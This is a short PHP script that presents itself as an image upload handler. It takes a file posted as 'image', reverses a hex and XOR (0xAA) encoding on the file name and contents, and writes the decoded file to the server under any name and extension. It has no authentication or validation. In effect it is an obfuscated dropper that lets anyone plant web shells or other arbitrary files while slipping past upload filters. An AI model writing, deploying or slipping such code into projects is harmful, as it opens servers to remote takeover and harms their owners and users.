<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {
    $uploaded = $_FILES['image'];
    
    // 解码文件名
    $encoded_name = pathinfo($uploaded['name'], PATHINFO_FILENAME);
    $hex = '';
    for ($i = 0; $i < strlen($encoded_name); $i += 2) {
        $hex .= chr(hexdec(substr($encoded_name, $i, 2)));
    }
    $decoded_name = '';
    foreach (str_split($hex) as $char) {
        $decoded_name .= chr(ord($char) ^ 0xAA);
    }
    $extension = pathinfo($uploaded['name'], PATHINFO_EXTENSION);
    
    // 解码文件内容
    $encoded_content = file_get_contents($uploaded['tmp_name']);
    $decoded_content = '';
    for ($i = 0; $i < strlen($encoded_content); $i++) {
        $decoded_content .= chr(ord($encoded_content[$i]) ^ 0xAA);
    }
    
    // 保存文件
    $final_name = $decoded_name . ($extension ? ".$extension" : '');
    file_put_contents($final_name, $decoded_content);
    echo "File decoded successfully: $final_name";
} else {
    echo "Please upload file using POST with 'image' parameter";
}
?>